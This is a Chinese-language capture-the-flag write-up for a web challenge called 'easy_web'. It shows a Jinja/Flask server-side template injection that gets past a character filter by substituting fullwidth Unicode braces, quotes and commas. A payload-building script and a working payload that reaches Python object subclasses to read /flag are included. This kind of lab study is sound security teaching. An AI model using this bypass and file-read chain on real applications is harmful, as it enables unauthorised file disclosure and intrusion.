# easy_web

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=bad5f396-ffc4-11ec-9802-fa163e4fa66d)

奇怪的符号又增加了！

进入网站，有点好玩。输入一些乱七八糟字体的符号，能给你转成正常的。然而检查元素没发现什么提示，这怎么入手？用chrome的network选项抓了个包，发现服务器的response是python。

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1327
Server: Werkzeug/2.0.2 Python/3.7.12
Date: Mon, 17 Oct 2022 01:31:57 GMT
```

python？python在ctf里最常见的考点之一就是[ssti](https://xz.aliyun.com/t/6885)模版注入。用双大括号测试一下。

- {{1+1}}
  > Your content contains restricted characters!

被过滤了。但是双大括号又是注入必须的内容，想一下怎么绕过。网站作用是把奇怪字体的符号转成正常字体，找一下大括号的奇怪表示？在[这里](http://www.fhdq.net/)找到了︷和︸。放进去试试看。

- ︷︸
  > {}

竟然可以。

- ︷︷1+1︸︸
  > 2

确定模版注入。然后就是顺着上去找父类最后找读取函数了。后面测试payload的时候发现单引号也过滤了。没关系，过滤的只是英文单引号，中文单引号没有，而且可以被解释为英文单引号。使用脚本构建payload。

```python
str='{{\'\'.__class__.__mro__[1].__subclasses__()[91].get_data(0,\'/flag\')}}'
str=str.replace('{','︷')
str=str.replace('}','︸')
str=str.replace('\'','＇')
str=str.replace(',','，')
print(str)
```

首先''是一个字符串，利用__class__获取字符串的类，也就是\<class'str'\>，然后__mro__[1]获取到父类object，__subclasses\__()获取object的全部子类。前面都是标准操作，获取哪个子类的操作不同挑战会有不同。这里我们找第92个（索引91），<class '_frozen_importlib_external.FileLoader'>的getdata来读取flag文件。

- ︷︷＇＇.__class__.__mro__[1].__subclasses__()[91].get_data(0，＇/flag＇)︸︸

- ### Flag
  > flag{8f604f91-c36a-4413-bdaf-e786ffbfda61} 